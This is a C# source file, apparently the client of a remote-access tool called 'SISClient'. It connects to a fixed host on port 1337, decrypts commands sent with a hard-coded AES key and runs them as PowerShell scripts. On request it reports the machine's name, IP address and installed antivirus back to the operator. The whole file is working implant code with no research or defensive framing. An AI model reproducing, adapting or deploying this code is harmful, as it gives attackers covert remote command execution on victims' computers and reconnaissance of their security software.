using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;
using System.Threading;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management;
using System.Net.NetworkInformation;

namespace SISClient
{
    class Program
    {
        private static readonly Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private const int _PORT = 1337;
        static void Main(string[] args)
        {
            ConnectToServer();
            RequestLoop();
        }

        private static void ConnectToServer()
        {
            int attempts = 0;
            while (!_clientSocket.Connected)
            {
                try
                {
                    attempts++;
                    Console.WriteLine("Connection attempt " + attempts);
                    _clientSocket.Connect(IPAddress.Parse("192.168.42.1"), _PORT);
                }
                catch
                {
                    Console.Clear();
                }
            }
            Console.Clear();
            Console.WriteLine("Connected");
        }

        private static void RequestLoop()
        {
            Console.WriteLine(@"<Type ""Exit"" to properly disconnect client>");
            while(true)
            {
                ReceiveResponse();
            }
        }
        private static void ReceiveResponse()
        {
            try
            {
                var buffer = new byte[2048];
                int received = _clientSocket.Receive(buffer, SocketFlags.None);
                if (received == 0) return;
                var data = new byte[received];
                Array.Copy(buffer, data, received);
                string text = Encoding.Unicode.GetString(data);
                text = Decrypt(text);
                Console.WriteLine(text);
                if (text == "control") sendCommand("OK");
                if (text.StartsWith("systeminfo-"))
                {
                    int id = int.Parse(text.Split('-')[1]);
                    string info = Environment.MachineName + "€" + GetIPAddress() + "€" + antivirusName();
                    string responde = "systeminfo;" + id.ToString() + ";" + info;
                    sendCommand(responde);
                }
                if (text != "control" && text != "systeminfo-")
                {
                        try
                        {
                            using (PowerShell PowerShellInstance = PowerShell.Create())
                            {
                                foreach (string t in text.Split(';'))
                                {
                                    PowerShellInstance.AddScript(t);
                                    IAsyncResult result = PowerShellInstance.BeginInvoke();
                                    while (result.IsCompleted == false)
                                    {
                                        Console.WriteLine("Waiting for pipeline to finish...");
                                        Thread.Sleep(1000);
                                    }
                                    Console.WriteLine("Finished!");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            sendCommand(ex.Message);
                        }
                }
            }
            catch
            {
            }
        }

        public static string antivirusName()
        {
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
            var instances = searcher.Get();
            string av = "";
            foreach (var instance in instances)
            {
                av = instance.GetPropertyValue("displayName").ToString();
            }
            if (av == "") av = "N/A";
            return av;
        }

        public static string GetIPAddress()
        {
            var address = NetworkInterface
            .GetAllNetworkInterfaces()
            .Where(i => i.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
            .SelectMany(i => i.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork)
            .Select(a => a.Address.ToString())
            .ToList();

            foreach (var a in address)
            {
                if (a != null) return a.ToString();
            }
            return "N/A";
        }

        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "SOMERANDKEY9189231215";
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return clearText;
            }
        }

        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "SOMERANDKEY9189231215";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                return "error";
            }
        }

        private static void sendCommand(String command)
        {
            String k = command;
            String crypted = Encrypt(k);
            byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
            _clientSocket.Send(data);
        }
    }
}
